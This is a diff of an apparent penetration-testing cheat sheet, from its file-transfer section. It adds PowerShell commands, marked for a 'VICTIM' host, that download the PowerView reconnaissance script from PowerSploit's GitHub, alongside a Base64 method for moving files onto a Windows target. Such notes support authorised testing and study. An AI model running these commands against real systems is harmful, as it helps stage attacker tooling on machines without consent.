@@ -129,12 +129,14 @@ stty -rows 48 -columns 120
 
 # FileTransfer
 
-# PowerShell - BASE64
-KALI: `cat file | base64 -w 0;echo`
+## PowerShell - BASE64
+- KALI: `cat file | base64 -w 0;echo`
+- VICTIM: `[IO.Fi[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("LS0t......="))`
 
-VICTIM: `[IO.Fi[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("LS0t......="))`
+## PowerShell - DownloadFile
+- VICTIM: `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`
 
-# PowerShell - BASE64
+- VICTIM: `(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')`
 
 ## Redis
 
